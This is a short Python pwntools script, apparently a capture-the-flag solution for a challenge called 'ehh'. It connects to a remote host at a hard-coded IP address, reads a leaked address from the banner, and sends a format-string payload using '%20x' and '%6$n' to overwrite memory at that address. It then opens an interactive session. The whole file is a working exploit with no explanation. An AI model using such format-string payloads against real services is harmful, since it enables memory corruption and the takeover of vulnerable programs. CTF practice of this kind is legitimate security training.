from pwn import *

#p = process("./ehh")
p = remote("18.222.213.102", 12345)

resp = p.recv()
print resp
val_addr = resp.split(" ")[4]
print "val_addr: " + val_addr

payload = p32(int(val_addr, 16))
payload += "%20x"
payload += "%6$n"

p.sendline(payload)
#print p.recv()
p.interactive()
